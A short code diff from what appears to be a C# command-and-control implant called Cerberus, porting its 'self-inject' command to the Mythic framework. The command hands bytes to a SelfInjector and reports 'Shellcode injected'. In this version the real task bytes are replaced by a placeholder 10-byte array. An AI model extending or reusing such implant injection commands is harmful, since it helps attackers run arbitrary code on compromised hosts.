@@ -7,10 +7,12 @@ namespace Cerberus.Commands
     {
         public override string Name => "self-inject";
 
-        public override string Execute(CerberusTask task)
+        public override string Execute(MythicTask task)
         {
+            var FileBytes = new byte[10];
+
             var injector = new SelfInjector();
-            var success = injector.Inject(task.FileBytes);
+            var success = injector.Inject(FileBytes);
 
             if (success) return "Shellcode injected";
             else return "Failed to inject shellcode";
